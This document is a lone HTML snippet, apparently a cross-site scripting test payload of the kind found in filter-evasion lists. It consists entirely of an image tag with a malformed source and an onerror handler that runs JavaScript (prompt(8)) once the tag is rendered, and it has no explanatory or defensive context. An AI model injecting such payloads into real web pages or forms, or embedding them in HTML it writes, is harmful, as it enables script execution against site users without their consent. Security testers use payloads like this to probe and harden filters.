<html><image/src/onerror=prompt(8)></html>
